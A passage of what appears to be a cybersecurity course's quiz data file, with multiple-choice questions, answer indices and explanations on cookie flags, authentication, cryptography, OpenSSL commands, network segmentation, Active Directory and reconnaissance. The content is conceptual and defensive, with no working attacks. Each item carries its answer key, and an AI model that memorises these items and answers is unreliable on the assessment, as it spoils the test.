          "ORMs typically use parameterised queries, reducing but not fully eliminating injection risk if misused.",
      },
    ],
  },
  {
    topicId: "m4-7",
    questions: [
      {
        question:
          "Which cookie attribute prevents JavaScript from reading the cookie value, mitigating theft via XSS?",
        options: ["Secure", "SameSite=Strict", "HttpOnly", "Path=/"],
        correctIndex: 2,
        explanation:
          "HttpOnly blocks client-side JavaScript from accessing the cookie, reducing the impact of an XSS vulnerability.",
      },
      {
        question:
          "Which cookie attribute ensures the cookie is only ever sent over an encrypted connection?",
        options: ["HttpOnly", "Secure", "SameSite", "Domain"],
        correctIndex: 1,
        explanation:
          "The Secure flag ensures the cookie is only transmitted over HTTPS.",
      },
      {
        question: "What attack does SameSite=Strict primarily mitigate?",
        options: [
          "SQL injection",
          "Cross-Site Request Forgery (CSRF)",
          "Buffer overflow",
          "DNS spoofing",
        ],
        correctIndex: 1,
        explanation:
          "SameSite=Strict blocks the cookie from being sent on cross-site requests, mitigating CSRF.",
      },
    ],
  },
  {
    topicId: "m4-8",
    questions: [
      {
        question: "MFA (Multi-Factor Authentication) combines:",
        options: [
          "Two or more of: something you know, something you have, something you are",
          "Two passwords only",
          "Two usernames",
          "A password and a CAPTCHA only",
        ],
        correctIndex: 0,
        explanation:
          "MFA combines 2+ of the three factors: Knowledge, Possession, and Inherence.",
      },
      {
        question:
          "A commonly cited vulnerability class in OAuth2 implementations involves:",
        options: [
          "Weak Wi-Fi encryption",
          "Misconfigured redirect URIs",
          "Slow database queries",
          "Missing CSS files",
        ],
        correctIndex: 1,
        explanation:
          "Misconfigured redirect URIs are a common OAuth2 vulnerability class that can lead to token theft/account takeover.",
      },
      {
        question:
          "OAuth2 primarily improves security over traditional login by:",
        options: [
          "Requiring users to share their password with every third-party app",
          "Using access tokens instead of a shared username/password",
          "Removing the need for authentication entirely",
          "Storing passwords in plaintext",
        ],
        correctIndex: 1,
        explanation:
          "OAuth2 uses delegated access tokens rather than requiring the shared username/password to be handled directly by the requesting party.",
      },
    ],
  },
  {
    topicId: "m4-9",
    questions: [
      {
        question:
          "RBAC (Role-Based Access Control) grants permissions based on:",
        options: [
          "A user's dynamic attributes like age or location",
          "A user's assigned role, e.g. Manager",
          "Random selection",
          "The current time of day only",
        ],
        correctIndex: 1,
        explanation:
          "RBAC ties permissions to a user's role, such as 'Manager' being permitted to approve expense reports.",
      },
      {
        question: "ABAC differs from RBAC in that it:",
        options: [
          "Only works with a single role per user",
          "Makes dynamic decisions based on attributes, e.g. age verification for a purchase",
          "Cannot be logged or audited",
          "Is only used in networking",
        ],
        correctIndex: 1,
        explanation:
          "ABAC (Attribute-Based) makes access decisions dynamically based on attributes, unlike RBAC's fixed role mapping.",
      },
      {
        question:
          "Broken Access Control vulnerabilities (covered later in the OWASP module) exploit failures in which process?",
        options: [
          "Encryption",
          "Authorization -- determining what an authenticated user is allowed to do",
          "DNS resolution",
          "TCP handshake",
        ],
        correctIndex: 1,
        explanation:
          "Authorization governs what an authenticated user is permitted to do; failures here are Broken Access Control.",
      },
    ],
  },
  {
    topicId: "m4-10",
    questions: [
      {
        question:
          "In Chrome DevTools, where do you view a site's cookies and their flags?",
        options: [
          "Console tab",
          "Application tab, Storage, Cookies",
          "Network tab, Headers only",
          "Elements tab, Styles",
        ],
        correctIndex: 1,
        explanation:
          "Chrome's Application tab (Firefox's Storage tab) under Cookies shows each cookie and its HttpOnly/Secure/SameSite flags.",
      },
      {
        question:
          "If a session cookie is missing the HttpOnly flag, what risk does this create?",
        options: [
          "The cookie can no longer be sent over HTTPS",
          "JavaScript (e.g. injected via XSS) can read and exfiltrate the cookie",
          "The cookie becomes encrypted automatically",
          "The server will reject all requests",
        ],
        correctIndex: 1,
        explanation:
          "Without HttpOnly, client-side JavaScript (including malicious injected scripts) can access the cookie via document.cookie.",
      },
      {
        question:
          "What is the purpose of manually editing a session cookie's value in DevTools and reloading the page?",
        options: [
          "To improve page load speed",
          "To observe how the application responds to a tampered/invalid session token",
          "To permanently disable cookies",
          "To bypass HTTPS entirely",
        ],
        correctIndex: 1,
        explanation:
          "Tampering the cookie value tests whether the server properly validates session tokens rather than trusting the client blindly.",
      },
    ],
  },
  {
    topicId: "m5-1",
    questions: [
      {
        question:
          "Which of the three (encoding, encryption, hashing) is reversible without any secret key?",
        options: [
          "Encoding",
          "Encryption",
          "Hashing",
          "None of them are ever reversible",
        ],
        correctIndex: 0,
        explanation:
          "Encoding (e.g. Base64) is simply a reformatting and can be reversed by anyone with no key needed.",
      },
      {
        question: "Why is hashing considered one-way?",
        options: [
          "Because it requires a public/private keypair",
          "Because there is no key that reverses a hash back to the original input",
          "Because it is a form of encoding",
          "Because it always produces variable-length output",
        ],
        correctIndex: 1,
        explanation:
          "Hashing produces a fixed-length digest with no key that can recover the original input; it's a one-way function.",
      },
      {
        question:
          "OWASP's 'Cryptographic Failures' category (A02) is largely caused by:",
        options: [
          "Using too many hash algorithms",
          "Treating encoding, encryption, or hashing as if they were interchangeable with each other",
          "Using AES for encryption",
          "Enforcing password complexity",
        ],
        correctIndex: 1,
        explanation:
          "OWASP A02 largely stems from confusing these three (e.g. using encoding or a fast hash where encryption is needed).",
      },
    ],
  },
  {
    topicId: "m5-2",
    questions: [
      {
        question: "Base64 encoding is most commonly used for:",
        options: [
          "Encrypting binary data with a secret key",
          "Representing binary data as ASCII text, e.g. in Basic Auth headers",
          "Making data completely unreadable to anyone",
          "Hashing passwords securely",
        ],
        correctIndex: 1,
        explanation:
          "Base64 encodes binary data as ASCII text and is commonly seen in Basic Auth headers and Burp's Decoder -- it provides no security.",
      },
      {
        question: "What does URL encoding do to a space character?",
        options: [
          "Converts it to %20",
          "Converts it to &lt;",
          "Removes it entirely",
          "Converts it to \\x00",
        ],
        correctIndex: 0,
        explanation:
          "URL encoding escapes special characters for safe inclusion in a URL; a space becomes %20.",
      },
      {
        question:
          "HTML encoding converting '<' to '&lt;' is primarily a defence against which attack?",
        options: [
          "SQL Injection",
          "Cross-Site Scripting (XSS)",
          "Command Injection",
          "Path Traversal",
        ],
        correctIndex: 1,
        explanation:
          "HTML encoding escapes characters with special HTML meaning, which is the core defence against XSS.",
      },
    ],
  },
  {
    topicId: "m5-3",
    questions: [
      {
        question:
          "What is the 'key exchange problem' in symmetric cryptography?",
        options: [
          "The difficulty of generating any key at all",
          "Both parties needing the same secret key, which is hard to share securely",
          "Symmetric crypto having no keys",
          "Symmetric crypto being too slow to use",
        ],
        correctIndex: 1,
        explanation:
          "Since symmetric crypto uses the same key for encryption and decryption, securely getting that shared key to both parties is the key exchange problem.",
      },
      {
        question:
          "Which symmetric algorithm is now considered weak due to its small 56-bit key size?",
        options: ["AES", "DES", "RSA", "SHA-256"],
        correctIndex: 1,
        explanation:
          "DES uses a trivially small 56-bit key and is considered weak/deprecated compared to AES.",
      },
      {
        question: "AES is used in which of the following real-world contexts?",
        options: [
          "Wi-Fi encryption (WPA2/3) and disk encryption like BitLocker",
          "Only in Base64 encoding",
          "Only in Diffie-Hellman key exchange",
          "Only in digital signatures",
        ],
        correctIndex: 0,
        explanation:
          "AES is the modern symmetric standard used in Wi-Fi encryption and disk/file encryption such as BitLocker.",
      },
    ],
  },
  {
    topicId: "m5-4",
    questions: [
      {
        question:
          "In asymmetric cryptography, what is used to encrypt data intended for only the owner to read?",
        options: [
          "The owner's private key",
          "The owner's public key",
          "A shared symmetric key",
          "A hash of the data",
        ],
        correctIndex: 1,
        explanation:
          "Anyone can encrypt with the recipient's public key, but only the corresponding private key can decrypt it.",
      },
      {
        question: "RSA's security is based on the difficulty of:",
        options: [
          "Factoring large prime numbers",
          "Reversing a hash function",
          "Brute-forcing AES keys",
          "Guessing a Base64 string",
        ],
        correctIndex: 0,
        explanation:
          "RSA relies on the computational difficulty of factoring the product of two large primes.",
      },
      {
        question: "Compared to RSA, ECC (Elliptic Curve Cryptography) offers:",
        options: [
          "Larger keys for the same security level",
          "Smaller keys for an equivalent level of security",
          "No use in TLS",
          "Only symmetric encryption",
        ],
        correctIndex: 1,
        explanation:
          "ECC achieves equivalent security to RSA with much smaller key sizes, and is widely used in modern TLS.",
      },
    ],
  },
  {
    topicId: "m5-5",
    questions: [
      {
        question: "Why are MD5 and SHA-1 unsuitable for password storage?",
        options: [
          "They are too slow to compute",
          "They are broken/crackable and lack built-in salting",
          "They are asymmetric algorithms",
          "They require a private key",
        ],
        correctIndex: 1,
        explanation:
          "MD5/SHA-1 are cryptographically broken and don't provide automatic salting, making them unsuitable and dangerous for password storage.",
      },
      {
        question:
          "Why is bcrypt preferred over SHA-256 specifically for hashing passwords?",
        options: [
          "bcrypt is faster than SHA-256",
          "bcrypt is deliberately slow and includes automatic per-hash salting",
          "SHA-256 cannot process text input",
          "bcrypt is a symmetric encryption algorithm",
        ],
        correctIndex: 1,
        explanation:
          "bcrypt (and Argon2) are purpose-built for passwords -- deliberately slow with automatic salting, unlike the fast general-purpose SHA-256.",
      },
      {
        question: "SHA-256 remains appropriate for which use case?",
        options: [
          "Password storage",
          "File integrity checks",
          "Encrypting a VPN tunnel",
          "Generating a session cookie's encryption key",
        ],
        correctIndex: 1,
        explanation:
          "SHA-256 is still cryptographically fine for integrity verification (like file hashes) but too fast for secure password storage.",
      },
    ],
  },
  {
    topicId: "m5-6",
    questions: [
      {
        question:
          "When creating a digital signature, what does the signer encrypt with their private key?",
        options: [
          "The entire plaintext message",
          "A hash of the message",
          "The recipient's public key",
          "A randomly generated session key",
        ],
        correctIndex: 1,
        explanation:
          "Signing hashes the message first, then encrypts that hash with the signer's private key.",
      },
      {
        question: "To verify a digital signature, the verifier uses:",
        options: [
          "The signer's private key",
          "The signer's public key",
          "Their own private key",
          "A shared symmetric key",
        ],
        correctIndex: 1,
        explanation:
          "Verification decrypts the signature using the signer's public key and compares it to a fresh hash of the message.",
      },
      {
        question:
          "Digital signatures primarily provide which two security properties?",
        options: [
          "Confidentiality and availability",
          "Integrity and authenticity",
          "Encoding and compression",
          "Anonymity and speed",
        ],
        correctIndex: 1,
        explanation:
          "A digital signature proves the message hasn't been altered (integrity) and confirms who sent it (authenticity).",
      },
    ],
  },
  {
    topicId: "m5-7",
    questions: [
      {
        question: "An X.509 certificate primarily binds:",
        options: [
          "A private key to a hash algorithm",
          "A public key to an identity (e.g. a domain name)",
          "A symmetric key to a session",
          "A username to a password",
        ],
        correctIndex: 1,
        explanation:
          "X.509 certificates bind a public key to an identity, signed by a trusted Certificate Authority.",
      },
      {
        question: "The 'chain of trust' in PKI describes:",
        options: [
          "A single Root CA signing every website certificate directly",
          "Root CAs signing Intermediate CAs, which sign site certificates",
          "A peer-to-peer trust with no CAs involved",
          "Browsers trusting every certificate automatically",
        ],
        correctIndex: 1,
        explanation:
          "Root CAs (trusted by the OS/browser) sign Intermediate CAs, which in turn sign individual site certificates.",
      },
      {
        question:
          "In a simplified TLS handshake, what happens right after the client and server agree on a cipher suite?",
        options: [
          "The session ends immediately",
          "The server presents its certificate",
          "The client sends its password",
          "The connection is immediately broken",
        ],
        correctIndex: 1,
        explanation:
          "After cipher suite negotiation, the server presents its certificate, followed by key exchange and the start of the encrypted session.",
      },
    ],
  },
  {
    topicId: "m5-8",
    questions: [
      {
        question: "What problem does Diffie-Hellman key exchange solve?",
        options: [
          "Hashing passwords securely",
          "Allowing two parties to derive a shared secret over an untrusted channel without transmitting it directly",
          "Encoding binary data as text",
          "Verifying a digital signature",
        ],
        correctIndex: 1,
        explanation:
          "Diffie-Hellman lets both parties independently compute the same shared secret using public values, without ever sending the secret itself.",
      },
      {
        question: "ECDH is best described as:",
        options: [
          "A hashing algorithm",
          "The elliptic-curve variant of Diffie-Hellman used in modern TLS",
          "A symmetric block cipher",
          "A password-hashing function",
        ],
        correctIndex: 1,
        explanation:
          "ECDH is the elliptic-curve version of Diffie-Hellman, widely used in TLS for forward secrecy.",
      },
      {
        question:
          "What security property does ECDH commonly enable in modern TLS?",
        options: [
          "Perfect/forward secrecy",
          "Base64 encoding",
          "SUID privilege escalation",
          "ARP spoofing prevention",
        ],
        correctIndex: 0,
        explanation:
          "ECDH-based key exchange in TLS supports forward secrecy, meaning a compromised long-term key can't decrypt past sessions.",
      },
    ],
  },
  {
    topicId: "m5-9",
    questions: [
      {
        question:
          "What is the significance of the '=' padding characters at the end of some Base64 strings?",
        options: [
          "They indicate an encryption key was used",
          "They pad the encoded output to a multiple of 4 characters",
          "They mark the string as hashed",
          "They indicate the string is URL-encoded",
        ],
        correctIndex: 1,
        explanation:
          "Base64 encoding groups input into 4-character blocks, using '=' padding when the input length isn't a multiple of 3 bytes.",
      },
      {
        question:
          "Which command decodes a Base64 string back to plaintext on Linux?",
        options: ["base64 -d", "base64 -e", "echo -n", "curl -I"],
        correctIndex: 0,
        explanation:
          "The -d flag on the base64 command decodes a Base64 string back to its original form.",
      },
      {
        question:
          "When URL-encoding a string, which character is typically converted to '%3D'?",
        options: [
          "Space",
          "Equals sign (=)",
          "Forward slash (/)",
          "Ampersand (&)",
        ],
        correctIndex: 1,
        explanation:
          "The equals sign is reserved in URL query strings and is percent-encoded as %3D when it needs to appear as literal data.",
      },
    ],
  },
  {
    topicId: "m5-10",
    questions: [
      {
        question: "Which OpenSSL command generates a 2048-bit RSA private key?",
        options: [
          "openssl rsa -pubout",
          "openssl genrsa -out private.pem 2048",
          "openssl dgst -sha256",
          "openssl req -x509",
        ],
        correctIndex: 1,
        explanation:
          "openssl genrsa -out private.pem 2048 generates a new 2048-bit RSA private key.",
      },
      {
        question:
          "After generating the private key, how do you derive the corresponding public key?",
        options: [
          "openssl rsa -in private.pem -pubout -out public.pem",
          "openssl genrsa -pubout",
          "openssl dgst -verify",
          "openssl enc -aes256",
        ],
        correctIndex: 0,
        explanation:
          "openssl rsa -in private.pem -pubout -out public.pem extracts the public key from the private key file.",
      },
      {
        question:
          "If a signed file is modified after signing, what happens when you attempt to verify it with the original signature?",
        options: [
          "Verification succeeds anyway",
          "Verification fails because the file's hash no longer matches the signed hash",
          "The public key is regenerated automatically",
          "The private key becomes invalid",
        ],
        correctIndex: 1,
        explanation:
          "Since the signature is built from a hash of the original file, any modification changes the hash and causes verification to fail.",
      },
    ],
  },
  {
    topicId: "m6-1",
    questions: [
      {
        question:
          "What is a key benefit of a corporate network architecture, according to this topic?",
        options: [
          "Elimination of the need for firewalls",
          "Centralised storage/backup and controlled access to systems like payroll",
          "Making every device permanently visible to the internet",
          "Removing the need for network segmentation",
        ],
        correctIndex: 1,
        explanation:
          "Corporate networks provide shared resources, centralized storage/backup, and controlled/restricted access to sensitive systems.",
      },
      {
        question:
          "In the 'office building' analogy used for corporate networks, what do firewalls represent?",
        options: [
          "The rooms/departments",
          "The corridors",
          "Security guards controlling entry",
          "The furniture",
        ],
        correctIndex: 2,
        explanation:
          "Firewalls act as the security guards controlling entry/exit between zones, analogous to rooms (departments) and corridors (the LAN).",
      },
      {
        question: "Corporate network security is best defined as:",
        options: [
          "A single antivirus product",
          "The practices, policies, and technologies safeguarding the network from unauthorised access and breaches",
          "Only the physical locks on server room doors",
          "A type of encryption algorithm",
        ],
        correctIndex: 1,
        explanation:
          "This topic defines corporate network security broadly as the combination of practices, policies, and technologies protecting the network.",
      },
    ],
  },
  {
    topicId: "m6-2",
    questions: [
      {
        question:
          "What is the main security drawback of a flat network topology?",
        options: [
          "It has no internet access",
          "A single compromised host can potentially reach every other device on the network",
          "It requires too many VLANs",
          "It cannot support Wi-Fi",
        ],
        correctIndex: 1,
        explanation:
          "In a flat network everything sits on one broadcast domain, so a single compromised host can reach everything.",
      },
      {
        question: "A segmented network improves security primarily by:",
        options: [
          "Removing all firewalls",
          "Splitting the network into zones/VLANs, limiting lateral movement if one segment is breached",
          "Increasing broadcast traffic across zones",
          "Disabling encryption",
        ],
        correctIndex: 1,
        explanation:
          "Segmentation isolates zones so a breach in one segment doesn't automatically grant access to others.",
      },
      {
        question:
          "A hub-and-spoke topology is most associated with which scenario?",
        options: [
          "A single home Wi-Fi network",
          "A central site connecting to multiple branch office sites",
          "A single-server flat network",
          "A DMZ-only design",
        ],
        correctIndex: 1,
        explanation:
          "Hub-and-spoke connects a central site to multiple branch sites, common in multi-office organisations.",
      },
    ],
  },
  {
    topicId: "m6-3",
    questions: [
      {
        question: "What does the 802.1Q standard provide?",
        options: [
          "DNS resolution",
          "VLAN tagging on trunk links carrying multiple VLANs",
          "Firewall rule syntax",
          "AES encryption",
        ],
        correctIndex: 1,
        explanation:
          "802.1Q is the standard protocol for tagging frames with VLAN IDs on trunk links.",
      },
      {
        question:
          "To route traffic between two different VLANs, what is required?",
        options: [
          "A hub",
          "A Layer-3 device (e.g. a router or Layer-3 switch)",
          "A DMZ",
          "An unmanaged Layer-2 switch alone",
        ],
        correctIndex: 1,
        explanation:
          "VLANs are isolated broadcast domains at Layer 2; inter-VLAN routing requires a Layer-3 capable device.",
      },
      {
        question:
          "Why might an organisation put HR, IT, and Finance on separate VLANs?",
        options: [
          "To increase broadcast traffic",
          "To provide security segmentation and logical grouping with better access control",
          "To make devices in different VLANs communicate freely by default",
          "To eliminate the need for a firewall",
        ],
        correctIndex: 1,
        explanation:
          "VLANs (e.g. VLAN 10=HR, 20=IT, 30=Finance) provide segmentation, reduce broadcast domains, and enable per-group access control.",
      },
    ],
  },
  {
    topicId: "m6-4",
    questions: [
      {
        question:
          "In a typical DMZ design, which traffic flow is normally allowed?",
        options: [
          "Internet directly to Internal LAN",
          "DMZ to Internal LAN unrestricted",
          "Internet to DMZ (for public-facing services)",
          "Internal LAN blocked from reaching DMZ entirely",
        ],
        correctIndex: 2,
        explanation:
          "The DMZ hosts public-facing services, so Internet-to-DMZ traffic is allowed, while DMZ-to-Internal is strictly restricted and Internet-to-Internal is blocked.",
      },
      {
        question:
          "Which of the following is a typical service hosted in a DMZ?",
        options: [
          "The domain controller holding all AD credentials",
          "A public-facing web server",
          "The internal payroll database",
          "The HR file share",
        ],
        correctIndex: 1,
        explanation:
          "DMZs typically host services that must be reachable from the internet, such as web servers, mail servers, and reverse proxies -- not sensitive internal systems.",
      },
      {
        question: "Why is a 3-legged firewall setup used for a DMZ?",
        options: [
          "To provide three separate physical buildings",
          "To give the firewall distinct interfaces for Internet, Internal LAN, and DMZ, each with its own rules",
          "To triple network bandwidth",
          "To replace VLAN tagging entirely",
        ],
        correctIndex: 1,
        explanation:
          "A 3-legged firewall has separate interfaces for Internet, Internal, and DMZ zones, enforcing distinct traffic rules between each pair.",
      },
    ],
  },
  {
    topicId: "m6-5",
    questions: [
      {
        question: "A Site-to-Site VPN is used to:",
        options: [
          "Connect an individual remote employee to the office",
          "Permanently link two office networks together over the internet",
          "Replace DNS resolution",
          "Encrypt only DNS traffic",
        ],
        correctIndex: 1,
        explanation:
          "Site-to-Site VPNs create a permanent encrypted link between two office networks, as opposed to Remote Access VPN for individual users.",
      },
      {
        question: "What is the general flow of a Remote Access VPN connection?",
        options: [
          "Connect to VPN server, encrypt traffic, travel securely, server forwards to destination, response returns via tunnel",
          "Connect directly to the destination with no encryption",
          "Traffic is sent in plaintext through a proxy",
          "DNS resolves the VPN server without any tunnel",
        ],
        correctIndex: 0,
        explanation:
          "This is the described flow: the client connects to the VPN server, traffic is encrypted through the tunnel, then forwarded to its destination and back.",
      },
      {
        question:
          "Corporate VPNs are commonly required for which of these use cases?",
        options: [
          "Connecting to TryHackMe/HackTheBox lab networks",
          "Viewing static HTML files locally",
          "Compiling source code",
          "Formatting a hard drive",
        ],
        correctIndex: 0,
        explanation:
          "Both TryHackMe and HackTheBox require a VPN connection to reach their isolated lab networks, mirroring corporate remote-access VPN use.",
      },
    ],
  },
  {
    topicId: "m6-6",
    questions: [
      {
        question: "In the AD analogy given, what does 'login' represent?",
        options: [
          "Authorization",
          "Authentication (the badge check)",
          "A Group Policy Object",
          "A forest",
        ],
        correctIndex: 1,
        explanation:
          "In the receptionist analogy, login represents authentication (proving identity), while access represents authorization.",
      },
      {
        question:
          "What is the hierarchical structure of Active Directory, from smallest to largest scope?",
        options: [
          "Forests, then Trees, then Domains",
          "Domains, then Trees, then Forests",
          "OUs, then Forests, then Domains",
          "Groups, then Forests, then Trees",
        ],
        correctIndex: 1,
        explanation:
          "AD's structure builds from Domains up to Trees and then Forests, with OUs grouping objects within a domain.",
      },
      {
        question:
          "What is the significance of 'Domain Admin' in a corporate pentest?",
        options: [
          "It is an irrelevant, low-value account",
          "It is typically the classic highest-value goal since it grants control over the entire domain",
          "It refers only to a DNS setting",
          "It is a synonym for a DMZ",
        ],
        correctIndex: 1,
        explanation:
          "Active Directory is the highest-value target in most corporate pentests, with Domain Admin being the classic ultimate goal.",
      },
    ],
  },
  {
    topicId: "m6-7",
    questions: [
      {
        question: "Which principle is central to Zero Trust?",
        options: [
          "Trust all devices inside the perimeter by default",
          "Never trust, always verify -- even for requests inside the traditional perimeter",
          "Only verify external requests",
          "Disable all authentication for speed",
        ],
        correctIndex: 1,
        explanation:
          "Zero Trust assumes no user/device is trusted by default, re-verifying every request regardless of network location.",
      },
      {
        question:
          "Micro-segmentation in a Zero Trust model primarily helps by:",
        options: [
          "Increasing broadcast domains",
          "Limiting lateral movement if a device/account is compromised",
          "Removing the need for IAM",
          "Disabling real-time monitoring",
        ],
        correctIndex: 1,
        explanation:
          "Micro-segmentation restricts communication between individual workloads/segments, limiting how far an attacker can move laterally.",
      },
      {
        question: "Which of these is named as a real Zero Trust tool/platform?",
        options: ["Wireshark", "Okta Identity Cloud", "Nmap", "Hashcat"],
        correctIndex: 1,
        explanation:
          "Okta Identity Cloud, along with Palo Alto Prisma Access and Microsoft Entra ID, is named as a real Zero Trust tool in this topic.",
      },
    ],
  },
  {
    topicId: "m6-8",
    questions: [
      {
        question:
          "How does EDR differ from traditional signature-based antivirus?",
        options: [
          "EDR only works offline",
          "EDR continuously gathers/analyses endpoint data in real time and can detect behaviour signature-based AV misses",
          "EDR is slower and less capable than AV",
          "EDR cannot isolate an infected endpoint",
        ],
        correctIndex: 1,
        explanation:
          "EDR provides continuous behavioural monitoring and can automatically isolate an infected endpoint, unlike static signature-based AV.",
      },
      {
        question:
          "Microsoft Defender integrates with which enterprise management tools?",
        options: [
          "Azure/O365/Intune",
          "Wireshark and Nmap",
          "GTFOBins",
          "BloodHound",
        ],
        correctIndex: 0,
        explanation:
          "Microsoft Defender integrates with Azure, Office 365, and Intune for centralised enterprise management.",
      },
      {
        question: "Traditional antivirus primarily relies on:",
        options: [
          "Signature-based detection of known malware",
          "Zero Trust micro-segmentation",
          "VLAN tagging",
          "TLS handshakes",
        ],
        correctIndex: 0,
        explanation:
          "Traditional AV detects malware by matching against known signatures, unlike EDR's behavioural approach.",
      },
    ],
  },
  {
    topicId: "m6-9",
    questions: [
      {
        question:
          "What is the key operational difference between an IDS and an IPS?",
        options: [
          "IDS actively blocks traffic; IPS only alerts",
          "IDS passively alerts; IPS sits inline and can actively block malicious traffic",
          "They are functionally identical",
          "IDS only works on wireless networks",
        ],
        correctIndex: 1,
        explanation:
          "IDS is passive/alerting only, while IPS sits inline in the traffic path and can actively drop malicious traffic.",
      },
      {
        question:
          "Anomaly-based detection's main drawback compared to signature-based detection is:",
        options: [
          "It cannot detect novel attacks",
          "It has a higher false-positive rate since it flags deviations from a baseline",
          "It requires no baseline at all",
          "It is identical to signature-based detection",
        ],
        correctIndex: 1,
        explanation:
          "Anomaly-based detection catches novel attacks by flagging deviations from normal behaviour but tends to generate more false positives.",
      },
      {
        question: "Signature-based detection's primary weakness is:",
        options: [
          "It cannot match known-bad patterns",
          "It misses novel/unknown attacks not yet in its database",
          "It is slower than anomaly-based detection",
          "It requires no database at all",
        ],
        correctIndex: 1,
        explanation:
          "Signature-based detection is fast but only matches known patterns, meaning novel attacks can slip through undetected.",
      },
    ],
  },
  {
    topicId: "m6-10",
    questions: [
      {
        question: "A Web Application Firewall (WAF) specifically inspects:",
        options: [
          "Only Layer 2 MAC addresses",
          "HTTP/HTTPS payloads for patterns like SQLi/XSS",
          "Only DNS queries",
          "Physical cabling",
        ],
        correctIndex: 1,
        explanation:
          "A WAF sits in front of web apps specifically inspecting HTTP/HTTPS traffic for malicious patterns like SQL injection and XSS.",
      },
      {
        question: "How does an NGFW differ from a traditional firewall?",
        options: [
          "NGFW only filters by port number",
          "NGFW combines deep packet inspection, IPS, and application-awareness, and can inspect encrypted HTTPS traffic",
          "NGFW cannot inspect any traffic",
          "NGFW is only used for DNS",
        ],
        correctIndex: 1,
        explanation:
          "NGFWs add deep packet inspection, IPS, and application-layer awareness beyond a traditional packet-filtering firewall.",
      },
      {
        question: "What is a common way attackers attempt to bypass a WAF?",
        options: [
          "Using encoding/obfuscation tricks on the payload",
          "Disabling their own browser",
          "Using a VPN only",
          "Sending fewer requests",
        ],
        correctIndex: 0,
        explanation:
          "Encoding or obfuscating malicious payloads is a classic technique to slip past WAF/NGFW pattern matching.",
      },
    ],
  },
  {
    topicId: "m6-11",
    questions: [
      {
        question:
          "What is a core security benefit of VDI (Virtual Desktop Infrastructure)?",
        options: [
          "Data stays on the server rather than the endpoint device",
          "It eliminates the need for a hypervisor",
          "It requires no connection broker",
          "It disables Group Policy",
        ],
        correctIndex: 0,
        explanation:
          "VDI centrally hosts desktops on servers and streams them to endpoints, keeping sensitive data on the server side rather than on potentially insecure endpoint devices.",
      },
      {
        question:
          "Which of the following is a named VDI component responsible for managing user connections to virtual desktops?",
        options: ["Connection Broker", "WAF", "DMZ", "VLAN tag"],
        correctIndex: 0,
        explanation:
          "The Connection Broker manages and directs user sessions to the appropriate virtual desktop instance.",
      },
      {
        question:
          "Which remote display protocol is mentioned as used by VDI solutions?",
        options: ["SMTP", "PCoIP", "FTP", "SNMP"],
        correctIndex: 1,
        explanation:
          "PCoIP, along with RDP and HDX, is named as a remote display protocol used to stream VDI sessions to end-user devices.",
      },
    ],
  },
  {
    topicId: "m6-12",
    questions: [
      {
        question:
          "In this lab's corporate network diagram, where should the AD domain controller typically be placed?",
        options: [
          "In the DMZ alongside the public web server",
          "On the internal network, connected to the internal VLANs",
          "Directly exposed to the internet",
          "Outside the firewall entirely",
        ],
        correctIndex: 1,
        explanation:
          "The domain controller is a sensitive internal asset and should sit on the internal network, not the DMZ.",
      },
      {
        question:
          "Why does the lab ask you to annotate traffic-flow arrows between zones?",
        options: [
          "To make the diagram colourful only",
          "To clearly show and justify which flows are allowed/blocked between zones",
          "Arrows are required by draw.io syntax",
          "To replace the need for a firewall",
        ],
        correctIndex: 1,
        explanation:
          "Labelling traffic flows demonstrates understanding of DMZ traffic rules -- which connections are permitted vs blocked between each zone.",
      },
      {
        question:
          "Which element should be labelled at the point it sits in the diagram, per the lab instructions?",
        options: [
          "Only cable colours",
          "Every security control such as firewall, IDS/IPS, and WAF",
          "Employee names",
          "Software license keys",
        ],
        correctIndex: 1,
        explanation:
          "The lab explicitly asks for every security control (firewall, IDS/IPS, WAF) to be labelled at its position in the diagram.",
      },
    ],
  },
  {
    topicId: "m7-1",
    questions: [
      {
        question:
          "Which phase comes immediately after Reconnaissance in the 5-phase model?",
        options: [
          "Gaining Access",
          "Scanning",
          "Covering Tracks",
          "Maintaining Access",
        ],
        correctIndex: 1,
        explanation:
          "The order is Reconnaissance, then Scanning, then Gaining Access, then Maintaining Access, then Covering Tracks.",
      },
      {
        question:
          "'Covering Tracks' is relevant in which context according to this course?",
        options: [
          "Every unauthorised attack",
          "Only within an authorised red-team engagement's agreed scope",
          "Never, since it's illegal in all contexts",
          "Only during passive OSINT",
        ],
        correctIndex: 1,
        explanation:
          "Covering tracks (clearing logs/artefacts) is only ever appropriate within an authorised, explicitly scoped red-team engagement.",
      },
      {
        question:
          "Which phase involves exploiting a vulnerability to establish an initial foothold?",
        options: [
          "Reconnaissance",
          "Scanning",
          "Gaining Access",
          "Maintaining Access",
        ],
        correctIndex: 2,
        explanation:
          "'Gaining Access' is the phase where a discovered vulnerability is actually exploited to obtain a foothold.",
      },
    ],
  },
  {
    topicId: "m7-2",
    questions: [
      {
        question:
          "Which tool is described as a search engine for internet-connected devices?",
        options: ["Shodan", "Netcraft", "WHOIS", "theHarvester"],
        correctIndex: 0,
        explanation:
          "Shodan indexes internet-connected devices and can be searched with queries like hostname:'example.com'.",
      },
      {
        question: "What information does a WHOIS lookup typically reveal?",
        options: [
          "Open ports on the target",
          "Registrar, nameservers, and organisation details for a domain",
          "The exact source code of a website",
          "Employee passwords",
        ],
        correctIndex: 1,
        explanation:
          "WHOIS reveals domain registration details such as registrar, nameservers, and the registering organisation.",
      },
      {
        question:
          "Why is passive recon considered lower-risk than active recon?",
        options: [
          "It requires touching the target server directly",
          "It gathers information without directly interacting with/touching the target",
          "It always requires written authorisation",
          "It is illegal in every jurisdiction",
        ],
        correctIndex: 1,
        explanation:
          "Passive footprinting uses only public sources, so the target never directly sees the recon activity, unlike active recon.",
      },
    ],
  },
  {
    topicId: "m7-3",
    questions: [
      {
        question:
          "What must be true before conducting active recon, per this topic?",
        options: [
          "Nothing, active recon requires no authorisation",
          "Explicit permission must be obtained and Rules of Engagement followed",
          "Only passive recon requires authorisation",
          "Active recon is always illegal regardless of authorisation",
        ],
        correctIndex: 1,
        explanation:
          "Active recon directly touches the target, so explicit authorisation and documented activity within the Rules of Engagement are required first.",
      },
      {
        question: "Banner grabbing is used to:",
        options: [
          "Encrypt traffic between hosts",
          "Reveal exact service versions from response headers/banners",
          "Perform a DNS zone transfer only",
          "Bypass a WAF automatically",
        ],
        correctIndex: 1,
        explanation:
          "Banner grabbing captures service version information directly from a service's response banner/headers.",
      },
      {
        question: "A ping sweep is primarily used to:",
        options: [
          "Crack passwords",
          "Map which hosts on a network range are alive",
          "Bypass a firewall entirely",
          "Encrypt DNS queries",
        ],
        correctIndex: 1,
        explanation:
